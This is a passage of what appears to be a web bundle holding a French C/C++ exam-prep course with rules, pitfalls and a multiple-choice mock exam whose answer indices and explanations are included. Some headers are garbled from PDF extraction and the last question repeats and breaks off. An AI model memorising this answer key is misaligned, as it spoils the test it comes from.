     fournit un mécanisme de gestion d'exceptions avec try, catch et throw.

     ➣ Syntaxe

 1   try {
 2       /* Code qui peut lever une exception */
 3       if ( denominateur == 0)
 4            throw runtime_error ( " Division par z'ero ! " ) ;
 5       int resultat = numerateur / denominateur ;
 6   }
 7   catch ( const runtime_error & e ) {
 8       cerr << " Erreur : " << e . what () << endl ;
 9   }
10   catch ( const exception & e ) {
11       cerr << " Exception : " << e . what () << endl ;
12   }
13   catch (...) {
14       cerr << " Exception inconnue ! " << endl ;
15   }

     ✿ Règle – Hiérarchie des exceptions standard
     std::exception est la classe de base. Principales dérivées :
         std::runtime_error : erreurs détectables à l'exécution
         std::logic_error : erreurs de logique du programme
         std::bad_alloc : échec d'allocation mémoire (new)
         std::out_of_range : accès hors limites (vector::at())
         std::invalid_argument : argument invalide
         std::overflow_error : débordement arithmétique
     Règle : capturer les exceptions spécifiques avant les générales. Capturer par référence con-
     stante (const exception &e).

 Chapitre     15
Concepts Avancés C++`},{id:"15.1",c:15,t:"Smart Pointers (C++11)",x:`❖ Définition – Pointeurs intelligents
     Les smart pointers gèrent automatiquement la durée de vie de la mémoire allouée dynamique-
     ment, évitant les fuites mémoire. Définis dans <memory>.

     ✿ Règle

      Smart Pointer Description
      unique_ptr<T>    Propriété exclusive. Non copiable, déplaçable.
      shared_ptr<T>    Propriété partagée. Comptage de références. Libéré quand le compteur
                       atteint 0.
      weak_ptr<T>      Référence faible vers un shared_ptr. N'incrémente pas le compteur.

     ➣ Syntaxe

 1   # include < memory >
 3   /* unique_ptr */
 4   unique_ptr < int > p1 = make_unique < int >(42) ;    /* C ++14 */
 5   unique_ptr < int [] > arr = make_unique < int [] >(10) ; /* Tableau */
 6   /* unique_ptr < int > p2 = p1 ; // ERREUR : non copiable */
 7   unique_ptr < int > p2 = move ( p1 ) ; /* OK : d'eplacement */
 9   /* shared_ptr */
10   shared_ptr < int > sp1 = make_shared < int >(42) ;
11   shared_ptr < int > sp2 = sp1 ; /* OK : compteur = 2 */
12   cout << sp1 . use_count () ;    /* 2 */
14   /* weak_ptr */
15   weak_ptr < int > wp = sp1 ;
16   if ( auto sp = wp . lock () ) {   /* V'erifier si encore valide */
17        cout << * sp << endl ;
18   }`},{id:"15.2",c:15,t:"Lambda expressions (C++11)",x:`➣ Syntaxe

 1   /* Syntaxe : [ capture ]( param è tres ) -> type_retour { corps } */
 3   auto somme = []( int a , int b ) { return a + b ; };
 4   cout << somme (3 , 4) ; /* 7 */
 6   /* Captures */
 7   int x = 10;
 8   auto f1 = [ x ]() { return x ; };            /*   Capture par valeur */
 9   auto f2 = [& x ]() { x ++; };                /*   Capture par r'ef'erence */
10   auto f3 = [=]() { return x ; };              /*   Tout par valeur */
11   auto f4 = [&]() { x ++; };                   /*   Tout par r'ef'erence */
12   auto f5 = [= , & x ]() { x ++; return x ;    };   /* Mixte */
14   /* Utilisation avec la STL */
15   vector < int > v = {5 , 3 , 1 , 4 , 2};
16   sort ( v . begin () , v . end () , []( int a , int b ) { return a > b ; }) ;
17   for_each ( v . begin () , v . end () , []( int x ) { cout << x << " " ; }) ;`},{id:"15.3",c:15,t:"Mots-clés modernes (C++11/14/17)",x:`✿ Règle

      Mot-clé         Description
      auto            Déduction automatique du type
      nullptr         Pointeur nul typé (remplace NULL)
      constexpr       Valeur calculable à la compilation
      override        Indique qu'une méthode redéfinit une méthode virtuelle
      final           Empêche l'héritage ou la redéfinition
      noexcept        Garantit qu'une fonction ne lève pas d'exception
      decltype        Déduit le type d'une expression
      static_assert   Vérification à la compilation`},{id:"15.4",c:15,t:"Range-based for loop (C++11)",x:`➣ Syntaxe

 1   vector < int > v = {1 , 2 , 3 , 4 , 5};
 3   /* Lecture seule */
 4   for ( const auto & x : v ) cout << x << " " ;
 6   /* Modification */
 7   for ( auto & x : v ) x *= 2;
 9   /* Fonctionne avec les tableaux C , les conteneurs STL , etc . */
10   int tab [] = {10 , 20 , 30};
11   for ( auto x : tab ) cout << x << " " ;

 Chapitre    16
Résumé des Points Clés pour le Concours
➔ Résumé rapide – Aide-mémoire C
   Types : char (1 octet), int (4), float (4), double (8), long long (8)
   Pointeur : stocke une adresse. & = adresse de, * = déréférencement
   Tableau : indices 0 à n-1, tab ≡ &tab[0], sizeof(tab)/sizeof(tab[0]) = nombre d'élé-
    ments
   Chaîne : tableau de char + '\\0'. Comparer avec strcmp(), jamais ==
   Allocation : malloc/calloc/realloc/free. Vérifier NULL. Chaque malloc ⇒ un free
   Struct : . (variable), -> (pointeur). Padding possible.
   Union : même mémoire. sizeof = plus grand membre.
   Enum : constantes entières nommées, début à 0 par défaut
   Static : conserve la valeur, portée limitée au fichier (global) ou au bloc (local)
   i++ retourne avant incrément, ++i incrémente avant retour

➔ Résumé rapide – Aide-mémoire C++
   POO : Encapsulation, Héritage, Polymorphisme, Abstraction
   Accès : private (défaut classe), protected, public (défaut struct)
   Règle des 3 : destructeur + copie constructeur + opérateur =
   Virtual : polymorphisme dynamique, vtable, override, destructeur virtuel obligatoire
   Abstrait : = 0 ⇒ ne peut pas être instancié
   new/delete : appellent constructeur/destructeur. new[] ⇒ delete[]
   Référence : alias, doit être initialisée, non réassignable
   Template : généricité à la compilation
   STL : vector, map, set, stack, queue, string, algorithmes
   Smart ptr : unique_ptr (exclusif), shared_ptr (partagée), weak_ptr (faible)
   Lambda : [capture](params){corps}

★ Astuce Concours – Stratégie le jour du concours
  1. Lire attentivement l'énoncé avant de répondre
  2. Tracer l'exécution mentalement, variable par variable
  3. Attention aux pièges : = vs ==, i++ vs ++i, pointeurs non initialisés
  4. Vérifier les limites des tableaux et les conditions d'arrêt des boucles
  5. Gestion mémoire : repérer les fuites et les accès après free/delete
  6. Polymorphisme : vérifier si virtual est présent pour la liaison dynamique
  7. Commencer par les questions faciles pour gagner du temps et de la confiance
  8. En cas de doute : éliminer les réponses manifestement fausses

 Chapitre    17
Examen Blanc n 1 – QCM C & C++          o

65 questions à choix multiples. Une seule bonne réponse par question (sauf indication contraire). Dif-
ficulté : ★ Facile, ★★ Moyen, ★★★ Dicile.`},{id:"18.1",c:18,t:"Explications des codes C/C++",x:`18.1.1     Pointeurs – Explication complète
    ❍ Note Comment lire un code avec pointeurs

1   int x = 42;               /* x est une variable contenant 42 */
2   int * p = & x ;           /* p est un pointeur vers x ( stocke l ' adresse de x ) */
3   printf ( " % d " , * p ) ; /* * p = dereferencer : acceder a la valeur pointee =
        42 */
4   * p = 100;                /* Modifie la valeur a l ' adresse pointee : x vaut
        maintenant 100 */

    Lecture ligne par ligne :
        int x = 42; : réserve 4 octets en mémoire, les nomme x, y stocke 42.
        int *p = &x; : &x donne l'adresse de x. p stocke cette adresse. * dans la déclaration signifie
         «pointeur vers int».
        *p : l'opérateur * devant un pointeur = déréférencement = «aller chercher la valeur à
         l'adresse stockée dans p».
        *p = 100; : modifie la valeur à l'adresse de x, donc x vaut maintenant 100.
    Règle fondamentale : & = «adresse de» ; * = «valeur pointée par». Toujours vérifier qu'un
    pointeur est valide avant de le déréférencer.

18.1.2     Allocation dynamique – Explication complète
    ❍ Note malloc, calloc, realloc, free

1   /* Allouer un tableau de 5 entiers */
2   int * tab = ( int *) malloc (5 * sizeof ( int ) ) ; /* Reserve 5*4 = 20 octets */
3   if ( tab == NULL ) { /* TOUJOURS verifier si malloc a reussi */
4        printf ( " Erreur d ' allocation \\ n " ) ;
5        return 1;
6   }
7   tab [0] = 10; /* Utiliser comme un tableau normal */
8   tab [1] = 20;

                                        18.1. EXPLICATIONS
                                               ET NOTIONS ÀDES
                                                           MÉMORISER
                                                               CODES C/C++
10   /* Redimensionner a 10 entiers */
11   tab = ( int *) realloc ( tab , 10 * sizeof ( int ) ) ;
13   free ( tab ) ;   /* OBLIGATOIRE : liberer la memoire */
14   tab = NULL ;     /* Bonne pratique : eviter le dangling pointer */

     Lecture :
         malloc(n) : réserve n octets sur le tas (heap). Retourne NULL si échec. Ne initialise PAS
          la mémoire.
         calloc(count, size) : comme malloc mais initialise tout à 0.
         realloc(ptr, new_size) : redimensionne un bloc déjà alloué.
         free(ptr) : libère la mémoire. Ne pas oublier sinon fuite mémoire (memory leak).
         Après free, le pointeur est «pendant» (dangling). Le mettre à NULL.

18.1.3      Récursivité – Explication
     ❍ Note Factorielle récursive
 1   int factorielle ( int n ) {
 2       if ( n <= 1) return 1;        /* Cas de base : arret de la recursion */
 3       return n * factorielle (n -1) ; /* Appel recursif sur un probleme plus
            petit */
 4   }
 5   /* factorielle (4) = 4 * factorielle (3) = 4 * 3 * factorielle (2) = ... =
        4*3*2*1 = 24 */

     Méthode pour analyser :
      1. Identifier le cas de base (quand la récursion s'arrête) : ici n <= 1.
      2. Identifier l'appel récursif : factorielle(n-1) ⇒ le problème réduit.
      3. Vérifier la convergence : n diminue de 1 à chaque appel ⇒ atteint le cas de base.
      4. Sans cas de base ou sans convergence ⇒ stack overflow.

18.1.4      POO C++ – Explication
     ❍ Note Classes, héritage et polymorphisme

 1   class Animal {
 2   public :
 3       virtual void crier () { cout << " ... " << endl ; } // Methode virtuelle
 4       virtual ~ Animal () {} // Destructeur virtuel ( obligatoire si heritage
              )
 5   };
 7   class Chien : public Animal { // Heritage public
 8   public :
 9       void crier () override { cout << " Ouaf ! " << endl ; } // Redefinition
10   };
12   // Utilisation polymorphe        :
13   Animal * a = new Chien () ;      // Type declare = Animal , type reel = Chien
14   a - > crier () ;                 // Affiche " Ouaf !" grace au polymorphisme (
           virtual )
15   delete a ;                       // Appelle ~ Chien () puis ~ Animal () (
           destructeur virtuel )

                           18.2. TOUTESRÈGLES
                                        LES DÉFINITIONS
                                              ET NOTIONSC/C++
                                                         À MÉMORISER
                                                              À MÉMORISER
 Explication :
     virtual : active la liaison dynamique (la méthode appelée dépend du type réel, pas du
      type déclaré).
     Sans virtual : liaison statique (la méthode dépend du type déclaré).
     override : indique explicitement une redéfinition (C++11). Erreur de compilation si la
      méthode parente n'existe pas.
     Destructeur virtual : obligatoire en cas d'héritage pour éviter les fuites mémoire.`},{id:"18.2",c:18,t:"Toutes les définitions C/C++ à mémoriser",x:`❖ Définition Glossaire C/C++

  Terme                 Définition
  Variable              Espace mémoire nommé, avec un type et une valeur modifiable.
  Pointeur              Variable qui stocke une adresse mémoire.
  Référence (C++)       Alias d'une variable. Doit être initialisée à la déclaration.
  Pile (Stack)          Mémoire automatique pour variables locales (LIFO).
  Tas (Heap)            Mémoire dynamique (malloc/new). Gérée manuellement.
  Struct                Regroupement de variables de types différents (membres publics par dé-
                        faut en C).
  Union                 Comme struct mais tous les membres partagent la même zone mémoire.
  Enum                  Type énuméré : ensemble de constantes entières nommées.
  Typedef               Crée un alias pour un type existant.
  Classe (C++)          Structure avec encapsulation (private par défaut), méthodes et con-
                        structeurs.
  Encapsulation         Cacher l'état interne (private) et exposer des méthodes (public).
  Héritage              Spécialiser une classe (relation «est-un»).
  Polymorphisme         Traiter différents types via un type commun (méthodes virtual).
  Abstraction           Classe abstraite : au moins une méthode = 0 (pure virtual).
  Template              Programmation générique : fonctions/classes paramétrées par un type.
  STL                   Standard Template Library : vector, map, set, string, algorithmes.
  Smart pointer         unique_ptr, shared_ptr : gestion automatique de la mémoire (C++11).
  Comportement          Le standard ne définit pas le résultat (ex: débordement tableau, dangling
  indéfini               ptr).
  Segmentation fault    Accès à une zone mémoire non autorisée (ex: déréférencer NULL).`},{id:"18.3",c:18,t:"Règles fondamentales à mémoriser",x:`✿ Règle 30 règles d'or C/C++
   1. sizeof(char) = 1 toujours. sizeof(int) = 4 généralement.
   2. Variables locales non initialisées = valeur indéterminée. Variables globales/static = 0.
   3. = (affectation) ̸= == (comparaison). if(x=5) est toujours vrai !
   4. Division entière : 5/2 = 2. Pour 2.5 : (float)5/2 ou 5.0/2.
   5. % (modulo) ne fonctionne qu'avec des entiers.

                                       18.4. PIÈGES
                                               ET NOTIONS
                                                    FRÉQUENTS
                                                          À MÉMORISER
                                                              AU CONCOURS
    6. i++ retourne la valeur avant incrémentation. ++i incrémente puis retourne.
    7. Un tableau en C est un pointeur vers le premier élément. tab[i] = *(tab+i).
    8. Les chaînes en C sont des tableaux de char terminés par \\0.
    9. scanf nécessite & sauf pour les chaînes (char[]).
   10. gets() est obsolète et dangereuse. Utiliser fgets().
   11. Un pointeur non initialisé ou libéré = dangling pointer. Toujours mettre à NULL après
       free.
   12. malloc retourne void*. Toujours caster en C++ et vérifier != NULL.
   13. Chaque malloc/new doit avoir un free/delete correspondant.
   14. Le passage par valeur copie. Le passage par pointeur/référence permet de modifier l'original.
   15. static dans une fonction : la variable persiste entre les appels.
   16. static au niveau fichier : limite la portée au fichier (linkage interne).
   17. const int *p : la valeur pointée est constante. int *const p : le pointeur est constant.
   18. En C++, struct et class sont identiques sauf la visibilité par défaut (public vs private).
   19. Constructeur de copie et operator= : à définir si la classe gère de la mémoire dynamique
       (Rule of Three/Five).
   20. Méthode virtual = liaison dynamique. Sans virtual = liaison statique.
   21. Destructeur virtual obligatoire si héritage (sinon fuite mémoire).
   22. Classe abstraite = au moins une méthode = 0 (pure virtual). Non instanciable.
   23. STL : vector pour accès indexé O(1), map pour clés triées O(log n), unordered_map pour
       accès moyen O(1).
   24. x  n = x × 2n ; x  n = x ÷ 2n (division entière).
   25. && et || utilisent l'évaluation paresseuse (short-circuit).
   26. break sort de la boucle courante. continue passe à l'itération suivante.
   27. switch sans break ⇒ fall-through (exécute les cas suivants).
   28. Tri fusion (Mergesort) : O(n log n) dans tous les cas. Quicksort : O(n2 ) pire cas.
   29. fseek(fp, 0, SEEK_END) + ftell(fp) = taille du fichier en octets.
   30. std::move() transfère les ressources (sémantique de déplacement, C++11).`},{id:"18.4",c:18,t:"Pièges fréquents au concours",x:`☞ Attention / Piège 20 pièges classiques C/C++

    1. if(x = 5) au lieu de if(x == 5) ⇒ toujours vrai (affectation, pas comparaison).
    2. Oublier le & dans scanf ⇒ comportement indéfini.
    3. Dépasser les bornes d'un tableau ⇒ comportement indéfini (pas d'erreur en C !).
    4. Oublier free() après malloc() ⇒ fuite mémoire.
    5. Double free() ⇒ comportement indéfini (crash probable).
    6. Déréférencer un pointeur NULL ⇒ segmentation fault.
    7. Oublier le \\0 dans les chaînes de caractères.
    8. Confondre char *s = "hello" (read-only) et char s[] = "hello" (modifiable).

                             18.5. MÉTHODE
                                      RÈGLESPOUR
                                              ET NOTIONS
                                                 EXPLIQUER
                                                         À MÉMORISER
                                                            UN PROGRAMME
     9. sizeof(pointeur) = taille de l'adresse (4 ou 8), PAS du tableau pointé.
    10. Oublier break dans un switch ⇒ fall-through.
    11. 5/2 = 2 (division entière), pas 2.5.
    12. unsigned int x = -1 ⇒ vaut UINT_MAX (wraparound).
    13. En C++, un constructeur avec explicit empêche les conversions implicites.
    14. Oublier virtual sur le destructeur en cas d'héritage.
    15. Appeler delete sur un tableau alloué avec new[] ⇒ comportement indéfini. Utiliser
        delete[].
    16. Le #define fait un remplacement textuel sans vérification de type.
    17. En C, const ne crée pas une vraie constante de compilation.
    18. Les variables register : juste une suggestion au compilateur (ignorée en C++ moderne).
    19. printf("%d", 3.14) ⇒ comportement indéfini (mauvais format).
    20. Un pointeur local retourné par une fonction ⇒ dangling pointer (la variable locale n'existe
        plus).

  ➔ Résumé rapide Complexités à retenir

   Opération                   Complexité Exemple
   Accès tableau               O(1)            tab[i]
   Recherche linéaire          O(n)            Parcours de liste
   Recherche dichotomique      O(log n)        Tableau trié
   Tri fusion                  O(n log n)      Mergesort (garanti)
   Tri rapide (moy.)           O(n log n)      Quicksort (moy.)
   Tri rapide (pire)           O(n2 )          Quicksort (pire)
   Tri à bulles / insertion    O(n2 )          Boucles imbriquées
   vector accès                O(1)            v[i]
   map accès                   O(log n)        Arbre rouge-noir
   unordered_map accès         O(1) moy.       Table de hachage`},{id:"18.5",c:18,t:"Méthode pour expliquer un programme",x:`Pour chaque extrait, repérer dans l'ordre : les types et valeurs initiales, les instructions qui changent
l'état, les appels de fonctions, puis la valeur achée ou retournée. Suivre une variable dans un petit
tableau (valeur avant/après chaque ligne) évite de deviner la sortie.
    Pointeurs : une variable pointeur contient une adresse ; \\&x donne l'adresse de x, *p accède à
     l'objet pointé. Vérifier qu'un pointeur est valide avant de le déréférencer.
    Allocation dynamique : malloc/calloc réservent, realloc redimensionne, free libère en C
     ; en C++, préférer conteneurs et pointeurs intelligents pour gérer la durée de vie.
    Récursivité : identifier le cas de base, puis l'appel sur un problème plus petit. Sans progression
     vers le cas de base, la pile d'appels s'èpuise.
    Polymorphisme : avec une méthode virtuelle, l'appel via une référence/pointeur de base est
     résolu selon le type réel. Sans virtual, la liaison est statique.
    STL : choisir le conteneur selon l'opération dominante : vector pour l'accès indexé, map pour
     les clés triées, unordered_map pour l'accès moyen par hachage.

                             18.5. MÉTHODE
                                      RÈGLESPOUR
                                              ET NOTIONS
                                                 EXPLIQUER
                                                         À MÉMORISER
                                                            UN PROGRAMME
 ◆ Mémoire Définitions et règles à retenir
 Une variable nomme une zone ayant un type ; une adresse localise cette zone ; un pointeur
 stocke cette adresse ; une référence C++ est un alias qui doit être initialisé. Durée de vie :
 automatique pour les variables locales, dynamique jusqu'à libération/fin de propriété. Complexité
 : O(1) constant, O(n) linéaire, O(log n) logarithmique, O(n2 ) quadratique. Un débordement de
 tableau, un pointeur pendant ou une double libération sont des comportements indéfinis.`}],wf=[{q:"Quelle est la taille garantie de sizeof(char) en C ?",o:["0 octet","1 octet","2 octets","Dépend du compilateur"],a:1,e:"B) 1 octet. Par définition du standard C, sizeof(char) vaut toujours 1. C'est la seule garantie de taille absolue. Les autres types ont des tailles minimales mais variables. A est faux car un char occupe toujours au moins 1 octet. C est faux car c'est la taille de short. D est faux car c'est fixé par le standard."},{q:'Quel est le résultat de printf("%d", 5/2) ?',o:["2.5","2","3","Erreur de compilation"],a:1,e:"B) 2. En C, la division de deux entiers (5/2) effectue une division entière, qui tronque la partie décimale. Le résultat est 2, pas 2.5. Pour obtenir 2.5, il faudrait écrire 5.0/2 ou (float)5/2."},{q:"Quelle directive permet d'éviter l'inclusion multiple d'un fichier header ?",o:["#include once","#ifndef / #define / #endif","#unique","#single"],a:1,e:"B) #ifndef / #define / #endif. C'est le mécanisme standard appelé «include guard». A, C et D ne sont pas des directives valides du préprocesseur C. Note : #pragma once existe aussi mais n'est pas standard (extension compil.)."},{q:`En C, quel est le résultat de ce code ?
 int x = 5;
 printf ( " % d % d " , x ++ , ++ x ) ;`,o:["5 7","6 7","5 6","Comportement indéfini"],a:3,e:"D) Comportement indéfini. Modifier une variable plus d'une fois entre deux points de séquence (sequence points) est un comportement indéfini en C. Les arguments de printf ne sont pas séparés par des points de séquence, donc modifier x deux fois ici est UB."},{q:"Quelle est la taille de sizeof(int *) sur un système 64 bits ?",o:["4 octets","8 octets","Dépend du type pointé","2 octets"],a:1,e:"B) 8 octets. Sur un système 64 bits, tous les pointeurs font 8 octets (64 bits), quel que soit le type pointé. sizeof(int *) = sizeof(char *) = sizeof(double *) = 8. C est faux : la taille du pointeur ne dépend pas du type pointé. A serait vrai sur un système 32 bits."},{q:"Quel est l'indice du dernier élément d'un tableau int tab[10] ?",o:["10","9","1","-1"],a:1,e:"B) 9. Les indices des tableaux en C commencent à 0 et vont jusqu'à taille - 1. Pour un tableau de 10 éléments, les indices valides sont 0 à 9. Accéder à tab[10] est un accès hors limites (com- portement indéfini)."},{q:`Quelle est la sortie de ce code C++ ?
 class A {
 public :
     A () { cout << " A " ; }
     ~ A () { cout << " ~ A " ; }
 };
 class B : public A {
 public :
     B () { cout << " B " ; }
     ~ B () { cout << " ~ B " ; }
 };
 int main () { B b ; return 0; }`,o:["BA~B~A","AB~A~B","AB~B~A","BA~A~B"],a:2,e:"C) AB~B~A. Le constructeur de la base (A) est appelé avant celui de la dérivée (B). Les destruc- teurs sont appelés dans l'ordre inverse : dérivée (~B) puis base (~A)."},{q:"Quelle est la différence entre struct et class en C++ ?",o:["struct ne supporte pas l'héritage","struct ne peut pas avoir de méthodes","L'accès par défaut est public pour struct et private pour class","Ils sont strictement identiques"],a:2,e:"C) La seule différence entre struct et class en C++ est le modificateur d'accès par défaut : public pour struct, private pour class. Les deux supportent l'héritage, les méthodes, les constructeurs, etc."},{q:"Que fait realloc(ptr, 0) ?",o:["Alloue 0 octets et retourne NULL","Ne fait rien","Équivalent à free(ptr)","Erreur de compilation"],a:2,e:"C) Équivalent à free(ptr). Selon le standard C, realloc(ptr, 0) libère la mémoire pointée par ptr et retourne NULL (ou un pointeur valide qui ne doit pas être déréférencé). Le comportement exact peut varier selon l'implémentation."},{q:`Quel est le résultat de ce code C ?
 int tab [] = {10 , 20 , 30 , 40 , 50};
 int * p = tab + 2;
 printf ( " % d " , *( p - 1) ) ;`,o:["10","20","30","40"],a:1,e:"B) 20. p = tab + 2 pointe sur tab[2] (= 30). p - 1 pointe sur tab[1] (= 20). Donc *(p - 1) = 20. L'arithmétique des pointeurs avance/recule par unités de la taille du type pointé."},{q:`Quelle est la sortie de ce code C++ ?
 class A {
 public :
     A () { cout << " A " ; }
     A ( const A &) { cout << " C " ; }
     ~ A () { cout << " D " ; }
 };
 void f ( A a ) {}
 int main () {
     A obj ;        // Construit A -> " A "
     f ( obj ) ;    // Copie -> " C " , puis destruction du param -> " D "
     return 0;      // Destruction de obj -> " D "
 }`,o:["ACD","ACDD","ADD","AADD"],a:1,e:"B) ACDD. 1) Construction de obj : «A». 2) Appel de f(obj) par valeur : constructeur de copie : «C». 3) Fin de f : destruction de la copie locale : «D». 4) Fin de main : destruction de obj : «D». Total : ACDD."},{q:"Quelle est la différence entre malloc et new ?",o:["new est plus rapide","new appelle le constructeur, malloc non","malloc est typé, new retourne void*","Aucune différence"],a:1,e:"B) new appelle le constructeur de l'objet, malloc alloue simplement de la mémoire brute sans initialisation. De même, delete appelle le destructeur, free non. C est inversé : c'est malloc qui retourne void* et new qui est typé."},{q:"Qu'est-ce qu'une fuite mémoire ?",o:["Accéder à la mémoire hors limites","Allouer de la mémoire sans jamais la libérer","Libérer la mémoire deux fois","Utiliser un pointeur nul"],a:1,e:"B) Une fuite mémoire (memory leak) survient quand de la mémoire allouée dynamiquement n'est jamais libérée. La mémoire reste occupée jusqu'à la fin du programme. A décrit un buffer overflow, C un double free, D un null pointer dereference."},{q:"Quel est le résultat de sizeof d'une union contenant un int (4) et un double (8) ?",o:["4","8","12","16"],a:1,e:"B) 8. La taille d'une union est égale à la taille de son plus grand membre. Ici, double (8 octets) > int (4 octets), donc sizeof(union) = 8 (possiblement avec du padding, mais ici 8 sut)."},{q:"Que signifie const int *p ?",o:["Le pointeur p ne peut pas être modifié","La valeur pointée ne peut pas être modifiée via p","Ni le pointeur ni la valeur ne peuvent être modifiés","p est une constante entière"],a:1,e:"B) const int *p signifie que p est un pointeur vers un int constant : on ne peut pas modifier la valeur pointée (*p = 5 est interdit), mais on peut changer ce vers quoi p pointe (p = &autre est permis). A décrit int *const p. C décrit const int *const p."},{q:`Quelle est la sortie ?
 void f ( int a ) { a = 100; }
 int main () { int x = 5; f ( x ) ; printf ( " % d " , x ) ; return 0; }`,o:["100","5","0","Erreur"],a:1,e:"B) 5. En C, le passage de paramètres se fait toujours par valeur. La fonction reçoit une copie de x. Modifier a dans la fonction ne modifie pas x dans main. Pour modifier x, il faudrait passer un pointeur : void f(int *a) { *a = 100; }."},{q:"En C++, une classe abstraite est une classe qui :",o:["N'a pas de constructeur","A tous ses membres privés","Contient au moins une méthode virtuelle pure (= 0)","Ne peut pas avoir de membres données"],a:2,e:"C) Une classe abstraite contient au moins une méthode déclarée avec = 0 (virtuelle pure). Elle ne peut pas être instanciée directement. A est faux : elle peut avoir un constructeur. B est faux : les modificateurs d'accès sont indépendants. D est faux : elle peut avoir des attributs."},{q:"Quelle est la complexité de l'accès à un élément dans un std::vector ?",o:["O(n)","O(log n)","O(1)","O(n2 )"],a:2,e:"C) O(1). Le std::vector stocke ses éléments de manière contiguë en mémoire (comme un tableau), permettant un accès direct par indice en temps constant. L'insertion/suppression en fin est O(1) amorti, mais en milieu c'est O(n)."},{q:"Que fait le mot-clé static pour une variable locale dans une fonction en C ?",o:["La rend accessible partout dans le programme","Elle conserve sa valeur entre les appels de la fonction","La rend constante","La place dans le tas (heap)"],a:1,e:"B) Une variable locale static est initialisée une seule fois et conserve sa valeur entre les appels successifs de la fonction. Sa portée reste locale à la fonction, mais sa durée de vie est celle du programme. Elle est stockée dans le segment de données, pas dans la pile."},{q:"Quel opérateur est utilisé pour accéder aux membres d'une structure via un pointeur ?",o:[".","->","::","*"],a:1,e:"B) ->. L'opérateur -> est utilisé pour accéder aux membres d'une structure via un pointeur. p->membre est équivalent à (*p).membre. . est utilisé avec une variable (pas un pointeur). :: est l'opérateur de résolution de portée."},{q:`Quelle est la sortie de ce code C++ ?
 class A { public : void f () { cout << " A " ; } };
 class B : public A { public : void f () { cout << " B " ; } };
 int main () { A * p = new B () ; p - > f () ; delete p ; return 0; }`,o:["B","A","AB","Erreur"],a:1,e:"B) A. La méthode f() n'est pas virtuelle dans la classe A. Sans virtual, c'est la liaison statique qui s'applique : le type déclaré du pointeur (A*) détermine la méthode appelée. Pour obtenir «B», il faudrait déclarer virtual void f()."},{q:"En C, quelle est la valeur de '\\0' ?",o:["La lettre 'O'","0 (zéro)","Le caractère espace","Non défini"],a:1,e:"B) 0 (zéro). '\\0' est le caractère nul (null terminator) dont la valeur ASCII est 0. Il marque la fin d'une chaîne de caractères en C. Ne pas confondre avec le caractère '0' (valeur ASCII 48) ou NULL (pointeur nul)."},{q:'Que retourne strcmp("abc", "abd") ?',o:["0","Une valeur négative","Une valeur positive","1"],a:1,e:"B) Une valeur négative. strcmp compare caractère par caractère. 'a'='a', 'b'='b', puis 'c' (99) < 'd' (100), donc «abc» < «abd» et strcmp retourne une valeur négative. Retourne 0 si égales, positif si la première est «plus grande»."},{q:"Quel type de conteneur STL stocke des paires clé-valeur triées ?",o:["vector","set","map","list"],a:2,e:"C) map. std::map stocke des paires clé-valeur triées par clé (arbre rouge-noir). set stocke des éléments uniques (pas des paires). vector et list sont des conteneurs séquentiels."},{q:"Quelle est la différence entre delete et delete[] ?",o:["Aucune différence","delete[] est plus rapide","delete[] libère un tableau alloué avec new[]","delete[] libère la mémoire et le pointeur"],a:2,e:"C) delete libère un seul objet alloué avec new. delete[] libère un tableau alloué avec new[]. Utiliser delete au lieu de delete[] pour un tableau est un comportement indéfini car les destructeurs de tous les éléments ne seraient pas appelés."},{q:"Quelle est la Règle des Trois en C++ ?",o:["Une classe ne peut avoir que 3 méthodes","Si on définit le destructeur, le constructeur de copie ou l'opérateur =, on doit","Une classe hérite de 3 classes maximum","Un template peut avoir 3 paramètres maximum"],a:1,e:"B) Si une classe gère des ressources dynamiques, elle doit définir les trois : destructeur, constructeur de copie et opérateur d'affectation. Sinon, la copie superficielle par défaut peut causer des double free ou des fuites mémoire."},{q:"En C, que se passe-t-il si on accède à tab[10] pour un tableau int tab[10] ?",o:["Retourne 0","Erreur de compilation","Comportement indéfini","Retourne une exception"],a:2,e:"C) Comportement indéfini. Le C ne vérifie pas les limites des tableaux. Accéder à tab[10] (hors limites : indices valides 0-9) est un comportement indéfini (UB). Il n'y a ni erreur de compilation, ni exception. Le programme peut fonctionner, crasher, ou corrompre des données."},{q:`Quel est le résultat ?
 int i = 0;
 while ( i < 5) {
     if ( i == 3) break ;
     printf ( " % d " , i ) ;
     i ++;
 }`,o:["0 1 2 3","0 1 2","0 1 2 3 4","1 2 3"],a:1,e:"B) 0 1 2. La boucle ache 0, 1, 2. Quand i == 3, le break sort de la boucle avant d'acher 3. A est faux car 3 n'est pas aché. C serait le résultat sans le break."},{q:"En C++, quel smart pointer permet la propriété exclusive ?",o:["shared_ptr","unique_ptr","weak_ptr","auto_ptr"],a:1,e:"B) unique_ptr. unique_ptr représente la propriété exclusive d'une ressource. Il n'est pas copi- able, mais déplaçable avec std::move. shared_ptr est pour la propriété partagée. auto_ptr est obsolète (C++11)."},{q:`Quelle est la sortie de ce code C ?
 char s [] = " Hello " ;
 printf ( " % lu " , sizeof ( s ) ) ;`,o:["5","6","4","8"],a:1,e:`B) 6. La chaîne "Hello" contient 5 caractères plus le caractère nul '\\0' à la fin. Donc sizeof(s) = 6 octets. strlen(s) retournerait 5 (sans le '\\0').`},{q:"Qu'est-ce qu'un void * en C ?",o:["Un pointeur qui ne pointe sur rien","Un pointeur générique qui peut pointer sur n'importe quel type","Un pointeur nul","Un pointeur vers une fonction void"],a:1,e:"B) Un void * est un pointeur générique. Il peut stocker l'adresse de n'importe quel type de données, mais il ne peut pas être déréférencé sans cast (car le compilateur ne connaît pas la taille du type pointé). malloc() retourne un void *."},{q:`Quelle est la sortie ?
 int i = 0;
 while ( i < 5) {
     if ( i == 3) break ;




        printf ( " % d " , i ) ;
        i ++;
